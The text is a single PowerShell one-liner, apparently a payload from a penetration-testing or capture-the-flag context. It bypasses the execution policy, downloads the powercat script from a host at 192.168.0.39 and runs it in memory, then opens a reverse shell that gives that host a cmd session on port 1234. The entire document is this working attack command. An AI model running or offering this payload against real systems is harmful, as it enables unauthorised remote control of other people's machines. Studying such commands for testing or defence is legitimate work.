powershell -exec bypass -c "iwr('http://192.168.0.39:8888/powercat.ps1')|iex;powercat -c 192.168.0.39 -p 1234 -e cmd"
